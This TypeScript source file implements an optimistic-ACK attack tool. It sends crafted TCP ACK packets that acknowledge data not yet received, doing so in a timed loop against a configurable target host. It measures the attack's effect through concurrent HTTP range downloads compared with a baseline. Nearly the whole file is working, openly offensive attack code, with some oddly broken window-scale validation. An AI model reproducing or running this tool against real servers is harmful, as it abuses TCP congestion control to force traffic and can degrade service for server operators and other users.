import { RawSocketManager } from './RawSocketManager';
import { PacketCrafter } from './PacketCrafter';
import { NetworkMonitor } from './NetworkMonitor';
import * as net from 'net';
import * as http from 'http';
import * as https from 'https';

export interface AttackConfig {
  targetHost: string;
  targetPort: number;
  attackDuration: number; // seconds
  packetInterval: number; // milliseconds
  ackAdvanceSize: number; // bytes
  windowScale: number;
  // New transfer options
  enableTransfer: boolean;
  transferType: 'download' | 'upload' | 'streaming';
  transferUrl?: string; // URL to download/stream from
  transferSize?: number; // Size in bytes for upload
  measureSpeed: boolean; // Whether to measure actual speed improvement
}

export interface AttackMetrics {
  packetsPressed: number;
  successfulAcks: number;
  connectionEstablished: boolean;
  attackStartTime: number;
  currentSpeed: number; // bytes/sec
  totalDataTransferred: number;
  // New metrics
  baselineSpeed: number; // Speed without attack
  attackSpeed: number; // Speed with attack
  speedImprovement: number; // Percentage improvement
  transferActive: boolean;
  transferProgress: number; // Percentage complete
}

export class OptimisticACKAttacker {
  private config: AttackConfig;
  private rawSocket: RawSocketManager;
  private packetCrafter: PacketCrafter;
  private networkMonitor: NetworkMonitor;
  private attackTimer: NodeJS.Timeout | null = null;
  private transferTimer: NodeJS.Timeout | null = null;
  private sequenceNumber: number = 0;
  private ackNumber: number = 0;
  private metrics: AttackMetrics;
  private connection: net.Socket | null = null;
  private isAttackActive: boolean = false;
  private transferStartTime: number = 0;
  private baselineCompleted: boolean = false;

  constructor(config: AttackConfig) {
    this.config = config;
    this.rawSocket = new RawSocketManager();
    this.packetCrafter = new PacketCrafter();
    this.networkMonitor = new NetworkMonitor();
    this.metrics = {
      packetsPressed: 0,
      successfulAcks: 0,
      connectionEstablished: false,
      attackStartTime: 0,
      currentSpeed: 0,
      totalDataTransferred: 0,
      baselineSpeed: 0,
      attackSpeed: 0,
      speedImprovement: 0,
      transferActive: false,
      transferProgress: 0
    };

    this.validateConfig();
  }

  private validateConfig(): void {
    // Ensure window scale doesn't create values > 65535
    if (this.config.windowScale > 1) {
      const maxWindowSize = 65535 * this.config.windowScale;
      if (maxWindowSize > 65535) {
        console.warn(`Window scale ${this.config.windowScale} would exceed 16-bit limit. Adjusting to safe value.`);
        this.config.windowScale = Math.floor(65535 / 32768); // Conservative scaling
      }
    }

    // Ensure other values are within reasonable bounds
    this.config.targetPort = Math.max(1, Math.min(65535, this.config.targetPort));
    this.config.packetInterval = Math.max(1, this.config.packetInterval);
    this.config.ackAdvanceSize = Math.max(1, this.config.ackAdvanceSize);
    this.config.attackDuration = Math.max(1, this.config.attackDuration);

    // New validation for transfer options
    if (this.config.enableTransfer && !this.config.transferUrl) {
      this.config.transferUrl = `http://${this.config.targetHost}:${this.config.targetPort}/download/xl.dat`;
    }
    
    if (this.config.transferType === 'upload' && !this.config.transferSize) {
      this.config.transferSize = 10 * 1024 * 1024; // 10MB default
    }
  }

  public async executeAttack(): Promise<void> {
    try {
      console.log('🚀 Starting Optimistic ACK Attack with Transfer Analysis...');
      
      // Initialize socket manager first
      console.log('🔧 Initializing socket manager...');
      await this.rawSocket.initialize();
      
      this.metrics.attackStartTime = Date.now();
      this.isAttackActive = true;

      if (this.config.measureSpeed) {
        console.log('📊 Phase 1: Measuring baseline speed (without attack)...');
        await this.measureBaselineSpeed();
        
        console.log('⚔️ Phase 2: Starting attack with concurrent transfer...');
        await this.executeAttackWithTransfer();
        
        console.log('📈 Calculating speed improvement...');
        this.calculateSpeedImprovement();
      } else {
        // Simple attack without measurement - BUT STILL CONCURRENT
        await this.establishConnection();
        
        console.log('🚀 Starting attack and transfer concurrently (no speed measurement)...');
        
        // Make them run in parallel
        const operations: Promise<void>[] = [
          this.startOptimisticACKLoop()
        ];
        
        if (this.config.enableTransfer) {
          operations.push(this.startConcurrentTransfer());
        }
        
        // Wait for both to complete
        await Promise.all(operations);
      }

    } catch (error) {
      console.error('Attack execution failed:', error);
      throw error;
    }
  }

  private async measureBaselineSpeed(): Promise<void> {
    if (!this.config.enableTransfer) return;

    console.log(`📥 Starting baseline transfer from ${this.config.transferUrl}`);
    const startTime = Date.now();
    
    try {
      const transferSize = await this.performTransfer(false); // No attack
      const duration = (Date.now() - startTime) / 1000;
      this.metrics.baselineSpeed = transferSize / duration;
      
      console.log(`✅ Baseline: ${this.formatSpeed(this.metrics.baselineSpeed)} (${this.formatBytes(transferSize)} in ${duration.toFixed(1)}s)`);
      this.baselineCompleted = true;
      
      // Wait a bit before starting attack
      await this.delay(2000);
    } catch (error) {
      console.warn('Baseline measurement failed:', error);
      this.metrics.baselineSpeed = 1000000; // 1MB/s fallback
    }
  }

  private async executeAttackWithTransfer(): Promise<void> {
    // Establish connection for attack
    await this.establishConnection();
    
    // Start attack and transfer concurrently
    const attackPromise = this.startOptimisticACKLoop();
    const transferPromise = this.startConcurrentTransfer();
    
    await Promise.all([attackPromise, transferPromise]);
  }

  private async startConcurrentTransfer(): Promise<void> {
    if (!this.config.enableTransfer) return;

    console.log(`🔄 Starting concurrent transfer during attack...`);
    this.metrics.transferActive = true;
    this.transferStartTime = Date.now();
    
    try {
      const transferSize = await this.performTransfer(true); // With attack
      const duration = (Date.now() - this.transferStartTime) / 1000;
      console.log('transferSize', transferSize, 'duration', duration);
      this.metrics.attackSpeed = transferSize / duration;
      
      console.log(`⚡ Attack transfer: ${this.formatSpeed(this.metrics.attackSpeed)} (${this.formatBytes(transferSize)} in ${duration.toFixed(1)}s)`);
    } catch (error) {
      console.error('Transfer during attack failed:', error);
    } finally {
      this.metrics.transferActive = false;
    }
  }

  private async performTransfer(duringAttack: boolean): Promise<number> {
    return new Promise((resolve, reject) => {
      const url = this.config.transferUrl!;
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      let totalBytes = 0;
      let progressInterval: NodeJS.Timeout;
      let contentLength = 0;

      // First, get the total file size with a HEAD request
      this.getFileSize(url).then(fileSize => {
        contentLength = fileSize;
        console.log(`📦 Starting chunked transfer: ${this.formatBytes(contentLength)} from ${url}`);
        
        // Track progress
        progressInterval = setInterval(() => {
          if (contentLength > 0) {
            this.metrics.transferProgress = (totalBytes / contentLength) * 100;
            if (duringAttack) {
              console.log(`📊 Transfer progress: ${this.metrics.transferProgress.toFixed(1)}% (${this.formatBytes(totalBytes)}/${this.formatBytes(contentLength)})`);
            }
          }
        }, 2000);

        // Start chunked download
        this.performChunkedDownload(url, contentLength, duringAttack, (chunk) => {
          totalBytes += chunk.length;
          
          // Record transfer in network monitor
          this.networkMonitor.recordTransfer(chunk.length, 1);
          
          // If attack is active, this data benefits from optimistic ACKs
          if (duringAttack && this.isAttackActive) {
            this.metrics.totalDataTransferred += chunk.length;
          }
        }).then(() => {
          clearInterval(progressInterval);
          this.metrics.transferProgress = 100;
          console.log(`✅ Chunked transfer completed: ${this.formatBytes(totalBytes)}`);
          resolve(totalBytes);
        }).catch((error) => {
          clearInterval(progressInterval);
          reject(error);
        });
        
      }).catch(reject);
    });
  }

  private async getFileSize(url: string): Promise<number> {
    return new Promise((resolve, reject) => {
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      const req = httpModule.request(url, { method: 'HEAD' }, (res) => {
        if (res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }
        
        const contentLength = parseInt(res.headers['content-length'] || '0');
        resolve(contentLength);
      });
      
      req.on('error', reject);
      req.setTimeout(10000);
      req.end();
    });
  }

  private async performChunkedDownload(
    url: string, 
    totalSize: number, 
    duringAttack: boolean,
    onChunk: (chunk: Buffer) => void
  ): Promise<void> {
    const isHttps = url.startsWith('https');
    const httpModule = isHttps ? https : http;
    
    // Configuration for chunked downloads
    // const chunkSize = duringAttack ? 
    //   Math.max(this.config.ackAdvanceSize, 65536) : // Larger chunks during attack
    //   65536; // Smaller chunks for baseline ( was 32768 )
    const chunkSize = Math.max(this.config.ackAdvanceSize, 65536) // keeping the size same for both attack and baseline
  
    let currentOffset = 0;
    
    console.log(`🔄 Starting ${duringAttack ? 'attack' : 'baseline'} chunked download (chunk size: ${this.formatBytes(chunkSize)})`);
    
    while (currentOffset < totalSize) {
      const endOffset = Math.min(currentOffset + chunkSize - 1, totalSize - 1);
      
      console.log(`📥 Requesting chunk: bytes ${currentOffset}-${endOffset} (${this.formatBytes(endOffset - currentOffset + 1)})`);
      
      await this.downloadChunk(url, currentOffset, endOffset, onChunk);
      
      currentOffset = endOffset + 1;
      
      // During attack, coordinate with ACK timing
      if (duringAttack && this.isAttackActive) {
        // Small delay to allow optimistic ACKs to influence the next request
        await this.delay(this.config.packetInterval);
      } else {
        // Baseline transfer - standard delay
        await this.delay(50);
      }
    }
  }

  private async downloadChunk(
    url: string, 
    start: number, 
    end: number, 
    onChunk: (chunk: Buffer) => void
  ): Promise<void> {
    return new Promise((resolve, reject) => {
      const isHttps = url.startsWith('https');
      const httpModule = isHttps ? https : http;
      
      const options = {
        headers: {
          'Range': `bytes=${start}-${end}`,
          'Connection': 'keep-alive', // Important for attack effectiveness
          'User-Agent': 'OptimisticACK-Attack-Tool/1.0'
        }
      };
      
      console.log(`🌐 Range request: ${options.headers.Range}`);
      
      const req = httpModule.get(url, options, (res) => {
        // Expect 206 Partial Content for range requests
        if (res.statusCode !== 206 && res.statusCode !== 200) {
          reject(new Error(`HTTP ${res.statusCode}: ${res.statusMessage}`));
          return;
        }
        
        console.log(`📡 Server response: ${res.statusCode} ${res.statusMessage}`);
        console.log(`📊 Content-Range: ${res.headers['content-range']}`);
        console.log(`📏 Content-Length: ${res.headers['content-length']}`);
        
        let chunkData = Buffer.alloc(0);
        
        res.on('data', (data) => {
          chunkData = Buffer.concat([chunkData, data]);
          onChunk(data); // Process each data chunk immediately
        });
        
        res.on('end', () => {
          console.log(`✅ Chunk completed: ${this.formatBytes(chunkData.length)}`);
          resolve();
        });
        
        res.on('error', (error) => {
          console.error(`❌ Chunk download error:`, error);
          reject(error);
        });
      });
      
      req.on('error', (error) => {
        console.error(`❌ Request error:`, error);
        reject(error);
      });
      
      // Set timeout based on attack duration
      req.setTimeout(this.config.attackDuration * 1000 / 4); // Quarter of attack duration per chunk
      
      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Chunk download timeout'));
      });
      
      req.end();
    });
  }

  private calculateSpeedImprovement(): void {
    if (this.metrics.baselineSpeed > 0 && this.metrics.attackSpeed > 0) {
      this.metrics.speedImprovement = ((this.metrics.attackSpeed - this.metrics.baselineSpeed) / this.metrics.baselineSpeed) * 100;
      
      console.log('\n📊 ATTACK EFFECTIVENESS ANALYSIS:');
      console.log(`├─ Baseline Speed: ${this.formatSpeed(this.metrics.baselineSpeed)}`);
      console.log(`├─ Attack Speed: ${this.formatSpeed(this.metrics.attackSpeed)}`);
      console.log(`└─ Speed Improvement: ${this.metrics.speedImprovement > 0 ? '+' : ''}${this.metrics.speedImprovement.toFixed(1)}%`);
      
      if (this.metrics.speedImprovement > 5) {
        console.log('🎯 SUCCESS: Optimistic ACK attack achieved significant speed improvement!');
      } else if (this.metrics.speedImprovement > 0) {
        console.log('⚠️ MARGINAL: Small speed improvement detected.');
      } else {
        console.log('❌ NO IMPROVEMENT: Attack may not be effective against this target.');
      }
    }
  }

  private async establishConnection(): Promise<void> {
    console.log(`🔗 Establishing TCP connection to ${this.config.targetHost}:${this.config.targetPort}...`);
    
    try {
      // Make sure socket manager is ready
      if (!this.rawSocket.isReady()) {
        await this.rawSocket.initialize();
      }
      
      this.connection = await this.rawSocket.establishConnection(
        this.config.targetHost,
        this.config.targetPort
      );
      
      this.metrics.connectionEstablished = true;
      this.sequenceNumber = Math.floor(Math.random() * 1000000);
      this.ackNumber = 1;

      console.log('✅ TCP connection established successfully');
    } catch (error) {
      console.error('Failed to establish connection:', error);
      throw error;
    }
  }

  private async startOptimisticACKLoop(): Promise<void> {
    const attackDuration = this.config.attackDuration * 1000;
    const startTime = Date.now();

    return new Promise((resolve) => {
      this.attackTimer = setInterval(async () => {
        try {
          if (!this.isAttackActive) {
            this.stopAttack();
            resolve();
            return;
          }

          await this.sendOptimisticACK();
          this.updateMetrics();
          
          // Check if attack duration exceeded
          if (Date.now() - startTime >= attackDuration) {
            this.stopAttack();
            resolve();
          }
        } catch (error) {
          console.error('Error in attack loop:', error);
        }
      }, this.config.packetInterval);
    });
  }

  private async sendOptimisticACK(): Promise<void> {
    // Make sure socket manager is ready
    if (!this.rawSocket.isReady()) {
      console.warn('⚠️  Socket manager not ready, skipping packet');
      return;
    }

    // Get current connection details
    const localEndpoint = this.rawSocket.getLocalEndpoint();
    
    // Increment ACK number optimistically (this is the attack!)
    this.ackNumber += this.config.ackAdvanceSize;
    
    const baseWindowSize = 32768;
    let windowSize = baseWindowSize;
    
    if (this.config.windowScale > 1) {
      windowSize = Math.min(65535, baseWindowSize * this.config.windowScale);
    }
    
    // During transfer, be more aggressive with window size
    if (this.metrics.transferActive) {
      windowSize = Math.min(65535, windowSize * 1.5);
    }
    
    // Create the malicious ACK packet
    const optimisticACK = this.packetCrafter.createOptimisticACKPacket(
      this.config.targetHost,
      this.config.targetPort,
      this.sequenceNumber,
      this.ackNumber,        // ← This is the LIE: we claim to have received more data
      windowSize,
      localEndpoint.ip,
      localEndpoint.port
    );

    try {
      // Send the real packet (not simulation!)
      await this.rawSocket.sendPacket(optimisticACK);
      
      this.metrics.packetsPressed++;
      this.metrics.successfulAcks++;
      
      // Detailed logging for real attack
      if (this.metrics.packetsPressed % 25 === 0) {
        const advancement = this.config.ackAdvanceSize;
        const totalAdvancement = this.metrics.packetsPressed * advancement;
        
        console.log(`⚔️  ATTACK STATUS:`);
        console.log(`├─ Packets: ${this.metrics.packetsPressed} | ACK: ${this.ackNumber}`);
        console.log(`├─ Advancement: +${advancement} bytes/packet | Total: +${this.formatBytes(totalAdvancement)}`);
        console.log(`├─ Window: ${windowSize} bytes | Mode: ${this.rawSocket.isReady() ? 'Real' : 'Simulation'}`);
        console.log(`└─ Server thinks we received: ${this.formatBytes(this.ackNumber)} total`);
      }
    } catch (error) {
      console.error('Error sending optimistic ACK:');
    }
  }

  private updateMetrics(): void {
    const elapsed = (Date.now() - this.metrics.attackStartTime) / 1000;
    this.metrics.currentSpeed = elapsed > 0 ? this.metrics.totalDataTransferred / elapsed : 0;
  }

  private formatBytes(bytes: number): string {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  }

  private formatSpeed(bytesPerSecond: number): string {
    return this.formatBytes(bytesPerSecond) + '/s';
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  public getMetrics(): AttackMetrics {
    return { ...this.metrics };
  }

  public stopAttack(): void {
    this.isAttackActive = false;
    
    if (this.attackTimer) {
      clearInterval(this.attackTimer);
      this.attackTimer = null;
    }

    if (this.transferTimer) {
      clearInterval(this.transferTimer);
      this.transferTimer = null;
    }

    if (this.connection) {
      this.connection.destroy();
      this.connection = null;
    }

    this.rawSocket.close();
    this.networkMonitor.stop();
    console.log('🛑 Optimistic ACK attack stopped');
  }

  public isActive(): boolean {
    return this.isAttackActive;
  }
}